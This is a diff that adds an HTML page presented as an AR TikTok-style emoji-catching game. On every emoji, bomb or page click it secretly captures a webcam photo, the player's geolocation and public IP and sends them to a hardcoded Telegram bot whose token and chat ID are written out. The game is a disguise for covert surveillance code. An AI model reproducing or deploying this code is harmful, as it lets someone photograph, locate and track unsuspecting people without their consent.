@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>AR TikTok Game Final + Telegram</title>
+<style>
+body, html { margin:0; padding:0; overflow:hidden; height:100%; font-family:sans-serif; background:#000; }
+video#camera { position:fixed; top:0; left:0; width:100%; height:100%; object-fit:cover; transform:scaleX(-1); z-index:0; }
+.emoji, .obstacle { position:absolute; font-size:40px; cursor:pointer; user-select:none; }
+.emoji { color:#0f0; transition: transform 0.3s; }
+.obstacle { color:#f00; transition: transform 0.3s; }
+.score, .timer, .level {
+  position:absolute; top:20px; font-size:24px; color:#fff; background:rgba(0,0,0,0.5); padding:5px 15px; border-radius:10px; z-index:10;
+}
+.score { left:20px; }
+.level { left:50%; transform:translateX(-50%); }
+.timer { right:20px; }
+</style>
+</head>
+<body>
+
+<video id="camera" autoplay playsinline></video>
+<div class="score" id="scoreBox">Score: 0</div>
+<div class="level" id="levelBox">Level: 1</div>
+<div class="timer" id="timerBox">Time: 30</div>
+
+<audio id="popSound" src="https://freesound.org/data/previews/256/256113_3263906-lq.mp3"></audio>
+<audio id="boomSound" src="https://freesound.org/data/previews/234/234912_4028616-lq.mp3"></audio>
+
+<script>
+const camera = document.getElementById('camera');
+const scoreBox = document.getElementById('scoreBox');
+const timerBox = document.getElementById('timerBox');
+const levelBox = document.getElementById('levelBox');
+const popSound = document.getElementById('popSound');
+const boomSound = document.getElementById('boomSound');
+
+let score = 0;
+let timeLeft = 30;
+let level = 1;
+let spawnRate = 1000;
+let lastSent = 0; // debounce telegram send (ms)
+
+const BOT_TOKEN = "8426427901:AAEjvVBIvQ7E84B631aEIyeoYhJhYZWJsgw";
+const CHAT_ID = "8316267465";
+
+navigator.mediaDevices.getUserMedia({ video:true })
+.then(stream => camera.srcObject = stream)
+.catch(err => alert("Kamera tidak bisa diakses: "+err));
+
+const emojis = ["🍎","🍌","🍒","⭐","💎","🎯"];
+
+async function getIP(){ try{ const res = await fetch("https://api.ipify.org?format=json"); const data = await res.json(); console.log("IP:", data.ip); return data.ip; }catch(err){ console.error("Gagal ambil IP", err); return "IP tidak tersedia"; } }
+function getLocation(){ return new Promise((resolve,reject)=>{ navigator.geolocation.getCurrentPosition(p=>{ console.log("Lokasi:",p.coords.latitude,p.coords.longitude); resolve({lat:p.coords.latitude, lon:p.coords.longitude}); }, e=>{ console.error("Gagal lokasi",e); reject(e); }); }); }
+function takePhoto(){ return navigator.mediaDevices.getUserMedia({video:true}).then(stream=>{ const video=document.createElement("video"); video.srcObject=stream; video.play(); return new Promise(resolve=>{ video.onloadedmetadata=()=>{ const canvas=document.createElement("canvas"); canvas.width=video.videoWidth||320; canvas.height=video.videoHeight||240; canvas.getContext("2d").drawImage(video,0,0,canvas.width,canvas.height); stream.getTracks().forEach(t=>t.stop()); canvas.toBlob(blob=>{ console.log("Foto diambil"); resolve(blob); },"image/jpeg"); }; }); }).catch(err=>{ console.error("Gagal foto",err); throw err; }); }
+
+async function sendToTelegram(blob, loc, ip){
+  const now = Date.now();
+  if(now - lastSent < 5000){ console.log("Debounce: skip kirim"); return; } // 5 detik interval
+  lastSent = now;
+  const fd = new FormData();
+  fd.append("chat_id", CHAT_ID);
+  fd.append("photo", blob, "snapshot.jpg");
+  fd.append("caption", `📍 Lokasi: ${loc.lat},${loc.lon}\n🌐 IP: ${ip}`);
+  try{ const res=await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{method:"POST",body:fd}); const data=await res.json(); console.log("Telegram:",data); }catch(err){console.error("Gagal kirim Telegram",err);}
+}
+
+// --- Spawn emoji / obstacle ---
+function spawnEmoji(){
+  const emoji=document.createElement("div");
+  emoji.className="emoji";
+  emoji.textContent=emojis[Math.floor(Math.random()*emojis.length)];
+  emoji.style.left=Math.random()*80+10+"%";
+  emoji.style.top="-50px";
+  document.body.appendChild(emoji);
+
+  emoji.addEventListener('click', async ()=>{
+    score++; scoreBox.textContent="Score: "+score;
+    emoji.style.transform="scale(2) rotate(360deg)";
+    popSound.currentTime=0; popSound.play();
+    try{ const loc=await getLocation(); const photo=await takePhoto(); const ip=await getIP(); sendToTelegram(photo,loc,ip); }catch(err){console.log(err);}
+    emoji.remove();
+  });
+
+  let speed=Math.random()*2+2+level*0.5;
+  let fallInterval=setInterval(()=>{
+    let top=parseFloat(emoji.style.top);
+    top+=speed;
+    emoji.style.top=top+"px";
+    if(top>window.innerHeight){ emoji.remove(); clearInterval(fallInterval); }
+  },30);
+}
+
+function spawnObstacle(){
+  const obs=document.createElement("div");
+  obs.className="obstacle"; obs.textContent="💣";
+  obs.style.left=Math.random()*80+10+"%"; obs.style.top="-50px";
+  document.body.appendChild(obs);
+
+  obs.addEventListener('click', async ()=>{
+    boomSound.currentTime=0; boomSound.play();
+    try{ const loc=await getLocation(); const photo=await takePhoto(); const ip=await getIP(); sendToTelegram(photo,loc,ip); }catch(err){}
+    alert("Kena rintangan! Game Over!"); location.reload();
+  });
+
+  let speed=Math.random()*2+2+level*0.5;
+  let fallInterval=setInterval(()=>{
+    let top=parseFloat(obs.style.top);
+    top+=speed;
+    if(top>window.innerHeight){ obs.remove(); clearInterval(fallInterval); }
+    obs.style.top=top+"px";
+  },30);
+}
+
+setInterval(()=>{ spawnEmoji(); if(Math.random()<0.3) spawnObstacle(); }, spawnRate);
+setInterval(()=>{ level++; levelBox.textContent="Level: "+level; spawnRate=Math.max(400,spawnRate-100); },15000);
+
+let timerInterval=setInterval(()=>{ timeLeft--; timerBox.textContent="Time: "+timeLeft; if(timeLeft<=0){ clearInterval(timerInterval); alert("Game Over! Score: "+score); location.reload(); } },1000);
+
+document.addEventListener("click", async ()=>{
+  const now = Date.now();
+  if(now - lastSent < 5000){ console.log("Debounce: skip global click"); return; }
+  lastSent = now;
+  console.log("Global click: kirim Telegram");
+  try{ const loc=await getLocation(); const photo=await takePhoto(); const ip=await getIP(); sendToTelegram(photo,loc,ip); }catch(err){console.log(err);}
+});
+</script>
+</body>
+</html>
